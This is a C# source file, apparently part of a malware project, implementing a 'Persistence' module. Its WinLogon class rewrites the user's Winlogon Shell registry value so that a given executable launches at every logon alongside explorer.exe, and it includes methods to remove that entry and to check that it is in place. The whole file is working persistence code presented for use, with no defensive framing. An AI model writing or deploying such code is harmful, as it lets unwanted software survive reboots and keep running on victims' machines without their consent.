using Microsoft.Win32;

namespace Main.Source.Functions.Persistence
{
    public class WinLogon
    {
        private const string LogonPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";

        public static void Install(string path)
        {
            var logon = Registry.CurrentUser.OpenSubKey(LogonPath, true);
            if (logon == null)
            {
                Utilities.Logger.Error("WinLogon.Install: failed to open Winlogon key");
                return;
            }

            try
            {
                logon.SetValue("Shell", $"explorer.exe, \"{path}\" {ConfigMisc.LAUNCH_KEY}");
            }
            catch
            {
                Utilities.Logger.Error($"WinLogon.Install: failed to install");
            }
        }

        public static void Uninstall()
        {
            var logon = Registry.CurrentUser.OpenSubKey(LogonPath, true);
            if (logon == null)
            {
                Utilities.Logger.Error("WinLogon.Uninstall: failed to open Winlogon key");
                return;
            }

            try
            {
                logon.SetValue("Shell", "explorer.exe");
            }
            catch
            {
                Utilities.Logger.Error($"WinLogon.Uninstall: failed to uninstall");
            }
        }

        public static string Check(string path)
        {
            var logon = Registry.CurrentUser.OpenSubKey(LogonPath, false);
            if (logon == null)
            {
                return "Failed to open Winlogon key (bad)";
            }

            var shell = logon.GetValue("Shell") as string;
            if (shell == null)
            {
                return "Failed to get Shell value (bad)";
            }

            if (shell == "explorer.exe")
            {
                return "File is not allowed to auto start (1) (bad)";
            }

            if (!shell.Contains(path))
            {
                return "File is not allowed to auto start (2) (bad)";
            }

            return "All is good (good)";
        }
    }
}
